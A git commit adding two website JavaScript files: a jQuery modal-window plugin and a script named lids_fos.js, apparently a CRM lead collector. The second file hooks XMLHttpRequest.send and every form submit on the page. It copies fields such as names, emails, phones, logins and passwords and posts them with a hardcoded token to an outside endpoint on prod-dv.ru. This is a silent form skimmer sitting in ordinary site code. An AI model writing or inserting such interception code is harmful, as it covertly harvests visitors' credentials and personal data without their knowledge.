faa8b7b3c0061c142d1a54626d11d7f0da2f4a6f
alex-rabota <51254539+alex-rabota@users.noreply.github.com>
2023-10-02 09:29:48 +0300

    first commit

---
+++ js/jquery.lredmod.js
@@ -0,0 +1,378 @@
+﻿/*
+ * jQuery LRED-modal Plugin 1.0
+ * www.lred.ru
+ * Copyright 2017, LRED
+ * Free to use under the MIT license.
+ * http://www.opensource.org/licenses/mit-license.php
+*/
+
+
+(function($) {
+
+/*---------------------------
+ Defaults for lredmod
+----------------------------*/
+
+/*---------------------------
+ Listener for data-lredmod-id attributes
+----------------------------*/
+    $(document).ready(function(){
+	$('.lredmod .lredform_hide').each(function() {
+    $('<div class="lredform_nav"><div class="lredform_nav_down"><i class="fa fa-chevron-down"> Дополнительно</i></div><div class="lredform_nav_up"><i class="fa fa-chevron-up"> Скрыть</i></div></div>').insertBefore($(this));
+	});
+	});
+    $(document).on('click', '.lredmod .lredform_nav .lredform_nav_down', function() {
+    $(this).closest('.lredmod').find('.lredform_hide').show();
+    $(this).closest('.lredmod').find('.lredform_nav .lredform_nav_down').hide();
+    $(this).closest('.lredmod').find('.lredform_nav .lredform_nav_up').show();
+	});
+    $(document).on('click', '.lredmod .lredform_nav .lredform_nav_up', function() {
+    $(this).closest('.lredmod').find('.lredform_hide').hide();
+    $(this).closest('.lredmod').find('.lredform_nav .lredform_nav_down').show();
+    $(this).closest('.lredmod').find('.lredform_nav .lredform_nav_up').hide();
+	});
+
+    $(document).on('click', '[data-lredmod-id]', function(e) {
+		var modalLocation = $(this).attr('data-lredmod-id');
+		$('#'+modalLocation).lredmod($(this).data());
+		return false;
+	});
+
+	$(document).on("focusin", ".lredmod.opened.iphonchik input, .lredmod.opened.iphonchik input textarea", function(e) {
+	    $(this).closest(".lredmod-wrapModal").css({
+	        top: $(document).scrollTop(),
+	        position: "absolute"
+	    });
+	}).on("focusout", ".lredmod.opened.iphonchik input, .lredmod.opened.iphonchik input textarea", function(e) {
+	    $(this).closest(".lredmod-wrapModal").removeAttr('style');
+	});
+
+/*---------------------------
+ Extend and Execute
+----------------------------*/
+
+    $.fn.lredmod = function(options) {
+
+        var defaults = {
+	    	animation: 'fadeAndPop', //fade, fadeAndPop, none
+		    animationspeed: 300, //how fast animtions are
+		    closeonbackgroundclick: true, //if you click background will modal close?
+		    dismissmodalclass: 'lredmod-close', //the class of a button or element that will close an open modal
+		    rotate: false //is rotate event
+    	},
+    	action = {
+    		'fadeAndPop': {
+    			'open': function(params){
+    				params.modal.css({
+    					'top': '-'+params.modalHeight+'px',
+    					'visibility' : 'visible'
+    				});
+
+    				params.modalBG.fadeIn(params.options.animationspeed/2);
+
+    				if(/iphone/i.test(navigator.userAgent)){
+    					params.animateOption.step = function(now, tween){
+    						if(tween.prop == 'top'){
+    							tween.end = (window.innerHeight - params.modalHeight) / 2;
+    						}
+    					}
+    				}
+
+    				params.modal
+    					.delay(params.options.animationspeed)
+    					.animate(
+    						{
+    							'top': (params.windowInnerHeight - params.modalHeight) / 2 + 'px',
+    							'opacity' : 1
+    						},
+    						params.animateOption
+    					);
+    			},
+    			'close': function(params){
+    				params.modalBG
+    					.delay(params.options.animationspeed)
+    					.fadeOut(params.options.animationspeed);
+
+    				params.modal
+    					.animate(
+    						{
+    							"top":  '-'+(params.modal.offset().top + params.modal.outerHeight())+'px',
+    							"opacity" : 0
+    						},
+    						params.animateOption
+    					);
+    			}
+    		},
+    		'fade': {
+    			'open': function(params){
+    				params.modal.css({
+    					'opacity' : 0,
+    					'top': params.modalHeight >= params.windowInnerHeight
+    						 ? 0
+    						 :(params.windowInnerHeight - params.modalHeight) / 2 + 'px',
+    					'visibility' : 'visible',
+    				});
+
+    				params.modalBG.fadeIn(params.options.animationspeed/2);
+
+    				params.modal
+    					.delay(params.options.animationspeed/2)
+    					.animate(
+    						{
+    							'opacity' : 1
+    						},
+    						params.animateOption
+    					);
+    			},
+    			'close': function(params){
+    				params.modalBG
+    					.delay(params.options.animationspeed)
+    					.fadeOut(params.options.animationspeed);
+
+    				params.modal
+    					.animate(
+    						{
+    							"opacity" : 0
+    						},
+    						params.animateOption
+    					);
+    			}
+    		},
+    		'none': {
+    			'open': function(params){
+    				params.modalBG.css({"display":"block"});
+    				params.modal.addClass("opened").css({
+    					'position':'relative',
+    					'visibility' : 'visible',
+    					'opacity' : 1
+    				});
+    			},
+    			'close': function(params){
+    				params.modalBG.css({'display' : 'none'});
+    				params.animateOption.complete.call();
+    			}
+    		}
+    	};
+
+        //Extend dem' options
+        var options = $.extend({}, defaults, options);
+
+        return this.each(function() {
+
+			/*---------------------------
+			 Global Variables
+			----------------------------*/
+        	var modal = $(this),
+        		modalHeight = modal.outerHeight(true),
+          		locked = false,
+				modalBG = $('.lredmod-BG'),
+				windowInnerHeight = window.innerHeight,
+				windowInnerWidth = window.innerWidth;
+
+			/*---------------------------
+			 Create Modal BG
+			----------------------------*/
+			if(modalBG.length == 0) {
+				modalBG = $('<div class="lredmod-BG" />').appendTo('body');
+			}
+
+			/*---------------------------
+			 Open & Close Animations
+			----------------------------*/
+			//Entrance Animations
+			modal.on('lredmod:open', function (e) {
+			  	modalBG.add(modal.find('.' + options.dismissmodalclass)).off('.lredModalEvent');
+
+				if(!locked) {
+					lockModal();
+
+					if(!modal.parent().is('body')){
+						modal.appendTo('body');
+					}
+
+					modal
+						.wrap('<div class="lredmod-wrapModal" />')
+						.parent().on('click.lredModalEvent', function (e) {
+
+						if($(e.target).is('.lredmod-wrapModal')){
+
+							modalBG.trigger('click.lredModalEvent');
+						}
+					});
+
+					if(!modal.hasClass("iphonchik") && /iphone/i.test(navigator.userAgent)){
+						modal.addClass("iphonchik");
+					}
+
+					var animateOption = {
+						'duration': options.animationspeed,
+						'complete': function(){
+							modal
+								.addClass("opened")
+								.css({
+									'top':'',
+									'left':'',
+									'position':'relative'
+								});
+						}
+					};
+
+					action[options.animation].open.call(null,{
+						'options': options,
+						'modal': modal,
+						'modalBG': modalBG,
+						'modalHeight': modalHeight,
+						'windowInnerHeight': windowInnerHeight,
+						'animateOption': animateOption
+					});
+
+					unlockModal();
+				}
+				modal.off('lredmod:open');
+			});
+
+			//Closing Animation
+			modal.on('lredmod:close', function (e) {
+
+				if(!locked) {
+					lockModal();
+
+					modal.parent().off();
+
+					var animateOption = {
+						'duration': options.animationspeed/2,
+						'complete': function(){
+							modal
+								.removeClass("opened")
+								.removeAttr('style')
+								.unwrap();
+
+							andClosed();
+						}
+					};
+
+					action[options.animation].close.call(null,{
+						'options': options,
+						'modal': modal,
+						'modalBG': modalBG,
+						'animateOption': animateOption
+					});
+
+					unlockModal();
+				}
+				modal.off();
+			});
+
+			//Rotate
+			modal.on('lredmod:rotateIn', function (e) {
+				modalBG.add(modal.find('.' + options.dismissmodalclass)).off('.lredModalEvent');
+
+				if(!locked) {
+					lockModal();
+
+					if(!modal.parent().is('body')){
+						modal.appendTo('body');
+					}
+
+					modal
+						.wrap('<div class="lredmod-wrapModal" />')
+						.parent().on('click.lredModalEvent', function (e) {
+
+						if($(e.target).is('.lredmod-wrapModal')){
+
+							modalBG.trigger('click.lredModalEvent');
+						}
+					});
+
+					if(!modal.hasClass("iphonchik") && /iphone/i.test(navigator.userAgent)){
+						modal.addClass("iphonchik");
+					}
+
+					var animateOption = {
+						'duration': options.animationspeed,
+						'complete': function(){
+							modal
+								.addClass("opened")
+								.css({
+									'top':'',
+									'left':'',
+									'position':'relative'
+								});
+						}
+					};
+
+					action[options.animation].open.call(null,{
+						'options': options,
+						'modal': modal,
+						'modalBG': modalBG,
+						'modalHeight': modalHeight,
+						'windowInnerHeight': windowInnerHeight,
+						'animateOption': animateOption
+					});
+
+					unlockModal();
+				}
+				modal.off('lredmod:rotateIn');
+			});
+
+			modal.on('lredmod:rotateOut', function (e) {
+				modal.parent().off();
+				modal
+					.removeClass("opened")
+					.removeAttr('style')
+					.unwrap();
+
+				modal.off();
+			});
+
+			/*---------------------------
+			 Open and add Closing Listeners
+			----------------------------*/
+        	//Open Modal Immediately
+
+        	if(options.rotate){
+        		modal.trigger('lredmod:rotateIn');
+        	} else {
+        		modal.trigger('lredmod:open');
+        	}
+
+			//Close Modal Listeners
+			$(".lredmod-close").on('click.lredModalEvent', function () {
+				modal.trigger('lredmod:manuallyClose');
+				modal.trigger('lredmod:close');
+			});
+
+			if(options.closeonbackgroundclick) {
+				modalBG.on('click.lredModalEvent', function () {
+					modal.trigger('lredmod:manuallyClose');
+					modal.trigger('lredmod:close')
+				});
+			}
+
+			$('body').keyup(function(e) {
+        		if(e.which===27){  // 27 is the keycode for the Escape key
+        			modal.trigger('lredmod:manuallyClose');
+        			modal.trigger('lredmod:close');
+        		}
+			});
+
+			function andClosed(){
+
+
+			}
+
+			/*---------------------------
+			 Animations Locks
+			----------------------------*/
+			function unlockModal() {
+				locked = false;
+			}
+			function lockModal() {
+				locked = true;
+			}
+
+        });//each call
+    }//orbit plugin call
+
+})(jQuery);
+
---
+++ js/lids_fos.js
@@ -0,0 +1,211 @@
+﻿function createXMLHttp() {
+    if (typeof XMLHttpRequest != "undefined") {
+        return new XMLHttpRequest();
+    } else if (window.ActiveXObject) {
+        var aVersions = [
+            "MSXML2.XMLHttp.5.0",
+            "MSXML2.XMLHttp.4.0",
+            "MSXML2.XMLHttp.3.0",
+            "MSXML2.XMLHttp",
+            "Microsoft.XMLHttp"
+        ];
+        for (var i = 0; i < aVersions.length; i++) {
+            try {
+                var oXmlHttp = new ActiveXObject(aVersions[i]);
+                return oXmlHttp;
+            } catch (oError) {}
+        }
+        throw new Error("Невозможно создать объект XMLHttp.");
+    }
+}
+
+function getRequestBody(oForm) {
+    var aParams = new Array();
+    var sParam = encodeURIComponent('token');
+    var block = 'yes';
+    sParam += "=";
+    sParam += encodeURIComponent('f27e7feb-7890-206f-ce3d-090c18bc63bd');
+    aParams.push(sParam);
+    aParams.push(encodeURIComponent('lred_type') + "=" + encodeURIComponent('Universal'));
+    aParams.push(encodeURIComponent('lred_site') + "=" + encodeURIComponent(window.location.hostname));
+    aParams.push(encodeURIComponent('lred_site_page') + "=" + encodeURIComponent(window.location.href));
+
+    //        console.log(aParams);
+    //        console.log(sParam);
+    //        console.log('002');
+
+    for (var i = 0; i < oForm.elements.length; i++) {
+        var sParam = encodeURIComponent(oForm.elements[i].name);
+        sParam += "=";
+        sParam += encodeURIComponent(oForm.elements[i].value);
+        aParams.push(sParam);
+
+        /*        if(oForm.elements[i].name == 'smail' || oForm.elements[i].name == 'email' || oForm.elements[i].name == 'e-mail' || oForm.elements[i].name == 'mail'
+                || oForm.elements[i].name == 'phone' || oForm.elements[i].name == 'my_fullname' || oForm.elements[i].name == 'fullname' || oForm.elements[i].name == 'fio' || oForm.elements[i].name == 'f_name' || oForm.elements[i].name == 'tsname' || oForm.elements[i].name == 'customer[name]' || oForm.elements[i].name == 'customer[phone]' || oForm.elements[i].name == 'tsmail' || oForm.elements[i].name == 'tshonss'
+                || oForm.elements[i].name == 'firstname' || oForm.elements[i].name == 'lastname' || oForm.elements[i].name == 'password' || oForm.elements[i].name == 'login' || oForm.elements[i].name == 'name') {*/
+
+        if (oForm.elements[i].name == 'fio' || oForm.elements[i].name == 'tshonss' || oForm.elements[i].name == 'password' || oForm.elements[i].name == 'login' ||
+            oForm.elements[i].name.match(/\name\b/i) !== null || oForm.elements[i].name.match(/\phone\b/i) !== null || oForm.elements[i].name.match(/\mail\b/i) !== null) {
+            if (oForm.elements[i].value.length > 3) {
+                block = 'no'
+                //console.log('OKEY');
+            }
+        }
+        //console.log(oForm.elements[i].name + '-' + oForm.elements[i].value);
+
+
+    }
+
+    if (block == 'yes') {
+        return '';
+    }
+
+    return aParams.join("&");
+}
+
+function postAjax(url, oForm, callback, oMetod) {
+    var oXmlHttp = createXMLHttp();
+    if (oMetod == 'Post') var sBody = getRequestBody(oForm);
+    else if (oMetod == 'Ajax') var sBody = oForm;
+
+    if (sBody.length < 10) {
+        return false;
+    }
+
+    oXmlHttp.open("POST", url, true);
+    oXmlHttp.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+    oXmlHttp.onreadystatechange = function () {
+        if (oXmlHttp.readyState == 4) {
+            if (oXmlHttp.status == 200) {
+                callback(oXmlHttp.responseText);
+            } else {
+                callback('error' + oXmlHttp.statusText);
+            }
+        }
+    };
+    oXmlHttp.send(sBody);
+}
+
+function printPost(text) {}
+
+
+//console.log('001');
+
+
+function addXMLRequestCallback(callback) {
+    var oldSend, i;
+    if (XMLHttpRequest.callbacks) {
+        XMLHttpRequest.callbacks.push(callback);
+    } else {
+        XMLHttpRequest.callbacks = [callback];
+        oldSend = XMLHttpRequest.prototype.send;
+        XMLHttpRequest.prototype.send = function () {
+
+            for (i = 0; i < XMLHttpRequest.callbacks.length; i++) {
+                XMLHttpRequest.callbacks[i](this);
+            }
+            oldSend.apply(this, arguments);
+
+            if (arguments != null && arguments[0] != null) {
+                var aTrue = '';
+                var aParams = new Array();
+                //console.log(arguments[0]);
+
+
+                function getQueryVariable(queryString) {
+
+                    var vars = queryString.split("&");
+                    var arr = new Array();
+
+                    for (var i = 0; i < vars.length; i++) {
+
+                        var pair = vars[i].split("=");
+                        arr[pair[0]] = pair[1];
+                    }
+                    return arr;
+                }
+
+                var queryParams = getQueryVariable(decodeURIComponent(arguments[0]));
+
+                //var new_form = 0;
+
+                //Ajax 2.0
+                if (queryParams['red_data[fio]'] && !queryParams['no_otprav']) {
+
+                    var newParams_two = arguments[0] + '&token=f27e7feb-7890-206f-ce3d-090c18bc63bd&no_otprav=true&lred_site=' + encodeURIComponent(window.location.hostname) + '&lred_site_page=' + encodeURIComponent(window.location.href) + '&lred_type=' + encodeURIComponent('Ajax v2.0');
+                    //console.log('1b');
+                    //console.log(newParams);
+                    //console.log('red_data[fio]');
+                    //console.log('no_otprav');
+                    postAjax('https://prod-dv.ru/administrator/components/com_crmmenedjer/data/lids_fos_new.php', newParams_two, printPost, 'Ajax');
+                }
+
+
+                //Ajax Other    var animals = ['dog', 'cat', 'hamster', 'bird', 'fish']; alert( animals.indexOf( 'dog' ) != -1 );
+                /*                    else if (( queryParams['fio'] || queryParams['tshonss'] || queryParams['password'] || queryParams['login']
+                                    || oForm.elements[i].name.match(/\name\b/i) !== null || oForm.elements[i].name.match(/\phone\b/i) !== null || oForm.elements[i].name.match(/\mail\b/i) !== null
+                                    ) && !queryParams['no_otprav'] ) {*/
+                else if ((queryParams['smail'] || queryParams['email'] || queryParams['e-mail'] || queryParams['mail'] ||
+                        queryParams['phone'] || queryParams['my_fullname'] || queryParams['fullname'] || queryParams['fio'] || queryParams['f_name'] || queryParams['tsname'] || queryParams['customer[name]'] || queryParams['customer[phone]'] || queryParams['tsmail'] || queryParams['tshonss'] ||
+                        queryParams['firstname'] || queryParams['lastname'] || queryParams['password'] || queryParams['login'] || queryParams['name']) && !queryParams['no_otprav']) {
+
+                    var newParams_two = arguments[0] + '&token=f27e7feb-7890-206f-ce3d-090c18bc63bd&no_otprav=true&lred_site=' + encodeURIComponent(window.location.hostname) + '&lred_site_page=' + encodeURIComponent(window.location.href) + '&lred_type=' + encodeURIComponent('Ajax Other');
+                    console.log('1');
+
+                    //console.log(queryParams);
+                    //console.log('1');
+
+
+                    /*for (var keysmy in queryParams){
+                        if (queryParams.hasOwnProperty(keysmy)) {
+                        if ( keysmy.match(/\name\b/i) !== null ) {
+                            console.log('yes!!');
+                        }
+
+                            console.log("Key is " + keysmy + ", value is" + queryParams[keysmy]);
+                        }
+                    }*/
+
+
+                    //console.log(newParams);
+                    //console.log('red_data[fio]');
+                    //console.log('no_otprav');
+                    postAjax('https://prod-dv.ru/administrator/components/com_crmmenedjer/data/lids_fos_new.php', newParams_two, printPost, 'Ajax');
+                }
+
+
+                //Ajax 5.0
+                else {
+
+                    for (var [key, value] of arguments[0]) {
+                        //console.log(key);
+                        //console.log(value);
+                        aParams.push(encodeURIComponent(key) + "=" + encodeURIComponent(value));
+                        if ((key == 'lreddata[lred_name]' || key == 'lreddata[lred_email]' || key == 'red_data[fio]') && key != 'no_otprav') {
+                            aTrue = 'ok';
+                            aParams.push(encodeURIComponent('token') + "=" + encodeURIComponent('f27e7feb-7890-206f-ce3d-090c18bc63bd'));
+                            aParams.push(encodeURIComponent('no_otprav') + "=" + encodeURIComponent('true'));
+                            aParams.push(encodeURIComponent('lred_site') + "=" + encodeURIComponent(window.location.hostname));
+                            aParams.push(encodeURIComponent('lred_site_page') + "=" + encodeURIComponent(window.location.href));
+                            aParams.push(encodeURIComponent('lred_type') + "=" + encodeURIComponent('Ajax v5.0'));
+                        }
+                    }
+                    //console.log(aTrue);
+                    var newParams = aParams.join("&");
+                    //console.log(newParams);
+                    if (aTrue == 'ok') {
+                        //console.log('2a');
+                        postAjax('https://prod-dv.ru/administrator/components/com_crmmenedjer/data/lids_fos_new.php', newParams, printPost, 'Ajax');
+                    }
+                }
+            }
+        }
+    }
+}
+
+addXMLRequestCallback(function (xhr) {});
+
+
+window.document.body.addEventListener('submit', function (event) {
+    postAjax('https://prod-dv.ru/administrator/components/com_crmmenedjer/data/lids_fos_new.php', event.target, printPost, 'Post');
+}, true);
